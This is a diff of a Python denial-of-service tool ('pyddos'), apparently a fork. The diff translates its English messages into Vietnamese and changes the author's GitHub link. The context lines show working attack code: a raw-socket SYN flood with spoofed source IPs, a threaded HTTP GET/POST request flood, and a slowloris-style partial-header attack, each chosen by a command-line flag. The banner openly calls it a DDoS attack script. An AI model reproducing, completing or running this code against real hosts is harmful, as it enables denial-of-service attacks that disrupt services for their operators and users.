@@ -9,9 +9,9 @@ title = '''
     _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
            ____/                                            _|         
                                                                     
- DDos python script | Script used for testing ddos | Ddos attack     
- Author: ___T7hM1___                                                
- Github: http://github.com/t7hm1/pyddos                             
+ Tập lệnh python DDos | Tập lệnh dùng để kiểm tra ddos | Tấn công Ddos   
+ Tác giả: ___T7hM1___                                               
+ Github: https://github.com/DauDau432/pyddos                           
  Version:'''+version+''' 
 '''
 
@@ -35,7 +35,7 @@ if os.name == 'posix':
 	else:
 		pass
 else:
-	print ('[-] Check your pip installer')
+	print ('[-] Kiểm tra trình cài đặt pip của bạn')
 
 try:
 	import requests,colorama
@@ -44,12 +44,12 @@ except:
 	try:
 		if os.name == 'posix':
 			os.system('sudo pip install colorama termcolor requests')
-			sys.exit('[+] I have installed nessecary modules for you')
+			sys.exit('[+] Tôi đã cài đặt các mô-đun nessecary cho bạn')
 		elif os.name == 'nt':
 			os.sytem('c:\python27\scripts\pip.exe install colorama requests termcolor')
-			sys.exit('[+] I have installed nessecary modules for you')
+			sys.exit('[+] Tôi đã cài đặt các mô-đun nessecary cho bạn')
 		else:
-			sys.exit('[-] Download and install nessecary modules')
+			sys.exit('[-] Tải xuống và cài đặt các mô-đun nessecary')
 	except Exception as e:
 		print ('[-]',e)
 if os.name == 'nt':
@@ -72,7 +72,7 @@ def check_tgt(args):
 	try:
 		ip = gethostbyname(tgt)
 	except:
-		sys.exit(cprint('[-] Can\'t resolve host:Unknow host!','red'))
+		sys.exit(cprint('[-] Không thể phân giải máy chủ: Máy chủ không xác định!','red'))
 	return ip
 
 
@@ -134,7 +134,7 @@ class Pyslow:
 				sock.sendto(self.mypkt(),(self.tgt,int(self.port)))
 				self.pkt_count+=1
 		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
+			sys.exit(cprint('[-] Người dùng đã hủy','red'))
 		return sock
 	def sending_packets(self):
 		try:
@@ -154,7 +154,7 @@ class Pyslow:
 				sock.sendall('X-a: b\r\n')
 				self.pkt_count+=1
 		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
+			sys.exit(cprint('[-] Người dùng đã hủy','red'))
 		return sock
 	def doconnection(self):
 		socks = 0
@@ -173,7 +173,7 @@ class Pyslow:
 			except Exception:
 				fail+=1
 			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user','red'))
+				sys.exit(cprint('[-] Người dùng đã hủy','red'))
 		cprint('\t\tSending packets','blue')
 		while socks < int(self.threads):
 			try:
@@ -189,7 +189,7 @@ class Pyslow:
 				fail+=1
 			except KeyboardInterrupt:
 				break
-				sys.exit(cprint('[-] Canceled by user','red'))
+				sys.exit(cprint('[-] Người dùng đã hủy','red'))
 		# print colored('I have sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' packets successfully.Now i\'m going to sleep for ','green') + colored(self.sleep,'red') + colored(' second','green')
 		time.sleep(self.sleep)
 
@@ -251,7 +251,7 @@ class Requester(Thread):
 				method = choice(['get','post'])
 				reqter.request(method.upper(),url,None,http_header)
 		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
+			sys.exit(cprint('[-] Người dùng đã hủy','red'))
 		except Exception as e:
 			print (e)
 		finally:
@@ -342,7 +342,7 @@ class Synflood(Thread):
 			self.lock.acquire()
 			self.sock.sendto(packet,(self.tgt,0))
 		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
+			sys.exit(cprint('[-] Người dùng đã hủy','red'))
 		except Exception as e:
 			cprint(e,'red')
 		finally:
@@ -382,16 +382,16 @@ Example:
 	if args.Synflood:
 		uid = os.getuid()
 		if uid == 0:
-			cprint('[*] You have enough permisson to run this script','green')
+			cprint('[*] Bạn có đủ quyền để chạy tập lệnh này','green')
 			time.sleep(0.5)
 		else:
-			sys.exit(cprint('[-] You haven\'t enough permission to run this script','red'))
+			sys.exit(cprint('[-] Bạn không có đủ quyền để chạy tập lệnh này','red'))
 		tgt=check_tgt(args)
 		synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
 		synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
 		ts=[]
 		threads=[]
-		print (colored('[*] Started SYN Flood: ','blue')+colored(tgt,'red'))
+		print (colored('[*] Bắt đầu SYN Flood: ','blue')+colored(tgt,'red'))
 		while 1:
 			if args.i == False:
 				args.fakeip = True
@@ -406,11 +406,11 @@ Example:
 					thread.start()
 					thread.join()
 			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user','red'))
+				sys.exit(cprint('[-] Người dùng đã hủy','red'))
 	elif args.Request:
 		tgt = args.d
 		threads = []
-		print (colored('[*] Start send request to: ','blue')+colored(tgt,'red'))
+		print (colored('[*] Bắt đầu gửi yêu cầu tới: ','blue')+colored(tgt,'red'))
 		while 1:
 			try:
 				for x in xrange(int(args.T)):
@@ -419,7 +419,7 @@ Example:
 					t.start()
 					t.join()
 			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user','red'))
+				sys.exit(cprint('[-] Người dùng đã hủy','red'))
 	elif args.Pyslow:
 		try:
 			tgt = args.d
@@ -434,11 +434,11 @@ Example:
 				worker=Pyslow(tgt,port,to,threads,st)
 				worker.doconnection()
 			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user','red'))
+				sys.exit(cprint('[-] Người dùng đã hủy','red'))
 	if not (args.Synflood) and not (args.Request) and not (args.Pyslow):
 		parser.print_help()
 		print
-		sys.exit(cprint('[-] You must choose attack type','red'))
+		sys.exit(cprint('[-] Bạn phải chọn kiểu tấn công','red'))
 
 if __name__ == '__main__':
 	main()
